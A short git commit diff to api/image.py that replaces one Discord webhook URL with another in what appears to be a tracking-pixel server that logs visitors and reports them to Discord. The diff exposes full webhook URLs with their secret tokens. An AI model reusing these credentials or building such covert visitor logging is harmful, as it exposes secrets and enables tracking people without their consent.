3faea20e9c495c0c93f6a0002a472f8127c9d847
diamondboi97-a11y <diamondboi97@gmail.com>
2026-04-03 20:41:55 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -10,7 +10,7 @@ from email.utils import formatdate
 
 PORT = 8000
 LOG_FILE = "access.log"
-DISCORD_WEBHOOK = ("https://discord.com/api/webhooks/1398083193265062020/OL-nBYHkOjSi8Nf50TJ9vA4UTyT6dhNcSTlF6vc4B-UEgmf8nHtnvMzj7DGd8iLiZDjt")  # Add your Discord webhook URL here
+DISCORD_WEBHOOK = ("https://discordapp.com/api/webhooks/1489710641605251226/vu2IK20KKBLcJzyuDS8gqP0ciu7S5dh3D9O0MMsJ2DAseYIVV9fJfSImln-4tfBE8Z_c") 
 PIXEL_PATH = "/tracking_pixel.gif"
 PIXEL_DATA = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
 
